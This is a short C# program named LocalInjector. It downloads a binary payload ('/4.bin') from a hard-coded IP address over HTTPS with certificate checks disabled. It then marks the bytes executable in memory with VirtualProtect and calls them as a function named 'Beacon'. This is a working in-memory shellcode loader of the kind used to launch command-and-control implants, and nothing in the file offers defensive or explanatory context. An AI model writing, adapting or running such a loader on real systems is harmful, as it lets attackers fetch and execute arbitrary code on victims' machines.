using System;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace LocalInjector
{
    internal class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void Beacon();

        [DllImport("kernel32.dll")]
        static extern unsafe bool VirtualProtect(
            byte* lpAddress,
            uint dwSize,
            MEMORY_PROTECTION flNewProtect,
            out MEMORY_PROTECTION lpflOldProtect);

        enum MEMORY_PROTECTION : uint
        {
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_READWRITE = 0x04
        }

        static async Task Main(string[] args)
        {
            byte[] shellcode;
            using (var client = new HttpClient())
            {
                ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                client.BaseAddress = new Uri("https://192.168.0.102");
                shellcode = await client.GetByteArrayAsync("/4.bin");
            }

            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    VirtualProtect(
                        ptr,
                        (uint)shellcode.Length,
                        MEMORY_PROTECTION.PAGE_EXECUTE_READWRITE,
                        out _);

                    var beacon = Marshal.GetDelegateForFunctionPointer<Beacon>((IntPtr)ptr);
                    beacon();
                }
            }
        }
    }
}

